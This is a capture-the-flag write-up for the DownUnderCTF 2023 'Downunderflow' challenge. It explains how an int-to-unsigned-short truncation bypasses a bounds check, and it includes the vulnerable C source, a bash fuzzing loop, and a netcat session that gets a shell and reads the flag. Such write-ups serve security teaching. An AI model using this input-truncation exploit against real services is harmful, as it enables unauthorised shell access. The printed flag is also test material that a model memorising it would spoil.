# Downunderflow

## Description

It's important to see things from different perspectives.

Author: joseph

Application: `nc 2023.ductf.dev 30025`<br>
Downloads: [downunderflow.c](https://play.duc.tf/files/dd8d9bf03ed898af1bd04ff369d4470e/downunderflow.c?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjo5MX0.ZPRHFQ.Asj2x7TBzZsfWJHMZYCISPuAx48),  [downunderflow](https://play.duc.tf/files/dc63aecad029210d62bd1f40cbf5c65f/downunderflow?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjo5Mn0.ZPRHFQ.1VvS1nIt-JKpzj6qBEnxko2bfZM)

##  Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USERNAME_LEN 6
#define NUM_USERS 8
char logins[NUM_USERS][USERNAME_LEN] = { 
	"user0", "user1", "user2", "user3", 
	"user4", "user5", "user6", "admin" 
};

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

int read_int_lower_than(int bound) {
    int x;
    scanf("%d", &x);
    if(x >= bound) {
        puts("Invalid input!");
        exit(1);
    }
    return x;
}

int main() {
    init();

    printf("Select user to log in as: ");
    unsigned short idx = read_int_lower_than(NUM_USERS - 1);
    printf("Logging in as %s\n", logins[idx]);
    if(strncmp(logins[idx], "admin", 5) == 0) {
        puts("Welcome admin.");
        system("/bin/sh");
    } else {
        system("/bin/date");
    }
}
```

Application is simple, if you are admin you get shell, if you are use you  get date. Problem is to be admin we need to get `logins[7]`, which `read_int_lower_than` makes it impossible for us.

The problem in validation is, it only checks positive values `if(x >= bound)` [Line 17].

C is a statically types language and it's primitive types have a defined limits. 

```c
// Online C compiler to run C program online
// https://www.programiz.com/c-programming/online-compiler/ 
#include <stdio.h>
#include <limits.h>

int main() {
    printf("int max: %d\nint min: %d", INT_MAX, INT_MIN);
    return 0;
}
// -------- Output ----------
> int max:  2147483647
> int min: -2147483648
```

_An integer overflow occurs when you attempt to store inside an integer variable a value that is larger than the maximum value the variable can hold._

In this case `int` is converted to `unsigned short` which will cause an overflow.
 
```c
unsigned short idx = read_int_lower_than(NUM_USERS - 1);
```

Doing a bit of fuzzing:

```bash
for i in {1..8}; do 
    overflow=$(( -2147483648 + $i ))
    echo "$i: $overflow"; echo $overflow | ./downunderflow | grep Logging -a; 
done;

# -------- Output ----------
1: -2147483647
Select user to log in as: Logging in as user1
2: -2147483646
Select user to log in as: Logging in as user2
3: -2147483645
Select user to log in as: Logging in as user3
4: -2147483644
Select user to log in as: Logging in as user4
5: -2147483643
Select user to log in as: Logging in as user5
6: -2147483642
Select user to log in as: Logging in as user6
7: -2147483641
Select user to log in as: Logging in as admin
8: -2147483640
Select user to log in as: Logging in as ��ԃN
```

## Solution 

```powershell
➜ ncat 2023.ductf.dev 30025
Select user to log in as: -2147483641
Logging in as admin
Welcome admin.
ls -lh
total 24K
-rw-r--r-- 1 65534 65534  31 Aug 31 02:12 flag.txt
-rwxr-xr-x 1 65534 65534 17K Aug 31 02:12 pwn
cat flag.txt
DUCTF{-65529_==_7_(mod_65536)}
```
::: tip Flag
`DUCTF{-65529_==_7_(mod_65536)}`
:::